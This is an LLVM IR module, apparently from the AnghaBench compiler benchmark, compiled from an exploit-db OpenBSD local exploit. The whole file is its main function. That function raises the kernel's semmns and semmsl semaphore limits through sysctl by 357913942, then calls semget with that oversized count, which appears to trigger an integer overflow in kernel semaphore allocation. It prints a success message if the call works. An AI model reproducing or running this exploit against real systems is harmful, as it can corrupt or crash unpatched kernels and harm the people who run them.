; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/openbsd/local/extr_23046.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/openbsd/local/extr_23046.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CTL_KERN = common dso_local global i32 0, align 4
@KERN_SEMINFO = common dso_local global i32 0, align 4
@KERN_SEMINFO_SEMMNS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [19 x i8] c"sysctl(get semmns)\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"sysctl(semmns)\00", align 1
@KERN_SEMINFO_SEMMSL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"sysctl(get semmsl)\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"sysctl(semmsl)\00", align 1
@IPC_PRIVATE = common dso_local global i32 0, align 4
@IPC_CREAT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"semget\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"Successfully got a semaphore\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"id = %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [3 x i32], align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i32 357913942, i32* %3, align 4
  %11 = load i32, i32* @CTL_KERN, align 4
  %12 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  store i32 %11, i32* %12, align 4
  %13 = load i32, i32* @KERN_SEMINFO, align 4
  %14 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 1
  store i32 %13, i32* %14, align 4
  %15 = load i32, i32* @KERN_SEMINFO_SEMMNS, align 4
  %16 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 2
  store i32 %15, i32* %16, align 4
  store i64 4, i64* %10, align 8
  %17 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %18 = call i32 @sysctl(i32* %17, i32 3, i32* %6, i64* %10, i32* null, i32 0)
  store i32 %18, i32* %4, align 4
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %0
  %22 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %69

23:                                               ; preds = %0
  %24 = load i32, i32* %6, align 4
  %25 = load i32, i32* %3, align 4
  %26 = add nsw i32 %24, %25
  store i32 %26, i32* %7, align 4
  %27 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %28 = call i32 @sysctl(i32* %27, i32 3, i32* %6, i64* %10, i32* %7, i32 4)
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %23
  %32 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %69

33:                                               ; preds = %23
  %34 = load i32, i32* @CTL_KERN, align 4
  %35 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  store i32 %34, i32* %35, align 4
  %36 = load i32, i32* @KERN_SEMINFO, align 4
  %37 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 1
  store i32 %36, i32* %37, align 4
  %38 = load i32, i32* @KERN_SEMINFO_SEMMSL, align 4
  %39 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 2
  store i32 %38, i32* %39, align 4
  store i64 4, i64* %10, align 8
  %40 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %41 = call i32 @sysctl(i32* %40, i32 3, i32* %8, i64* %10, i32* null, i32 0)
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* %4, align 4
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %46

44:                                               ; preds = %33
  %45 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %69

46:                                               ; preds = %33
  %47 = load i32, i32* %8, align 4
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %9, align 4
  %50 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %51 = call i32 @sysctl(i32* %50, i32 3, i32* %8, i64* %10, i32* %9, i32 4)
  store i32 %51, i32* %4, align 4
  %52 = load i32, i32* %4, align 4
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %46
  %55 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %69

56:                                               ; preds = %46
  %57 = load i32, i32* @IPC_PRIVATE, align 4
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* @IPC_CREAT, align 4
  %60 = call i32 @semget(i32 %57, i32 %58, i32 %59)
  store i32 %60, i32* %2, align 4
  %61 = load i32, i32* %2, align 4
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %56
  %64 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %69

65:                                               ; preds = %56
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  %67 = load i32, i32* %2, align 4
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 %67)
  store i32 0, i32* %1, align 4
  br label %69

69:                                               ; preds = %65, %63, %54, %44, %31, %21
  %70 = load i32, i32* %1, align 4
  ret i32 %70
}

declare dso_local i32 @sysctl(i32*, i32, i32*, i64*, i32*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @semget(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
